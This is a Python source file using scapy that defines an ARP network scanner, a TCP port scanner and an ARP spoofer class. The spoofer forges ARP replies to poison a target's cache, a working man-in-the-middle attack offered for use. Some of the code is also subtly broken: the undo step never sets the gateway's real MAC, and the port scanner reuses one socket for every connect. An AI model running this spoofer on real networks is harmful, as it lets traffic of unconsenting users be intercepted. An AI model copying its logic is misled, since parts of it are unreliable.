import scapy.all as scapy
import socket
from src.models.client import Client
from src.models.port import Port


class Scanner:

    def __init__(self, timeout):
        self.timeout = timeout

    def get_arp(self, ip, op=None, mac=None, gateway=None, gateway_mac=None):
        if op!=None and mac!=None and gateway!=None:
            return scapy.ARP(op=op, pdst=ip, hwdst=mac, psrc=gateway)
        elif op!=None and mac!=None and gateway_mac!=None:
            return scapy.ARP(op=op, pdst=ip, hwdst=mac, psrc=gateway, hwsrc=gateway_mac)
        else:
            return scapy.ARP(pdst=ip)
    
    def get_ether(self, value):
        return scapy.Ether(dst=value)
    
    def get_ip(self, value):
        return scapy.IP(dst=value)

    def get_tcp(self, port, flag):
        return scapy.TCP(dport=port, flags=flag)

    def create_srp_packet(self, arp, ether):
        return ether / arp
    
    def create_srp1_packet(self, ip, tcp):
        return ip / tcp

    def send_srp_packet(self, packet, timeout):
        return scapy.srp(packet, timeout=timeout, verbose=False)[0]
    
    def send_srp1_packet(self, packet, timeout):
        return scapy.srp1(packet, timeout=timeout, verbose=False)

    def send_packet(self, packet):
        return scapy.send(packet, verbose=False)

class DeviceScanner(Scanner):

    def __init__(self, ip_range):
        super().__init__(timeout = 20)
        self.ip_range = ip_range
        self.mac = "ff:ff:ff:ff:ff:ff"

    def scan(self):
        print("[+] Scanning devices...")
        packet = super().create_srp_packet(super().get_arp(self.ip_range), super().get_ether(self.mac))
        response = super().send_srp_packet(packet, self.timeout)
        clients = []
        for sent, received in response:
            clients.append(Client(received.psrc, received.hwsrc))
        return clients


class PortScanner():

    def __init__(self, ip, startport, endport):
        self.ip = ip
        self.startport = startport
        self.endport = endport
    
    def scan(self):
        print("[+] Scanning ports...")
        ports=[]
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        for port in range(self.startport, self.endport+1):
            try:
                s.connect((self.ip, port))
                ports.append(Port(port, True))
            except:
                ports.append(Port(port, False))
                    
        return ports


class ARPSpoofer(Scanner):

    def __init__(self):
        super().__init__(timeout = 5)
        self.mac = "ff:ff:ff:ff:ff:ff"
        self.op = 2
    
    def get_mac_address(self, ip):
        packet = super().create_srp_packet(super().get_arp(ip), super().get_ether(self.mac))
        response = super().send_srp_packet(packet, self.timeout)
        return response[0][1].hwsrc
    
    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac_address(target_ip)
        packet = super().get_arp(target_ip, self.op, target_mac, spoof_ip)
        super().send_packet(packet)
    
    def undo_spoof(self, target_ip, gateway_ip):
        target_mac = self.get_mac_address(target_ip)
        gateway_mac = self.get_mac_address(gateway_ip)
        packet = super().get_arp(target_ip, self.op, target_mac, gateway_ip, gateway_mac)
        super().send_packet(packet)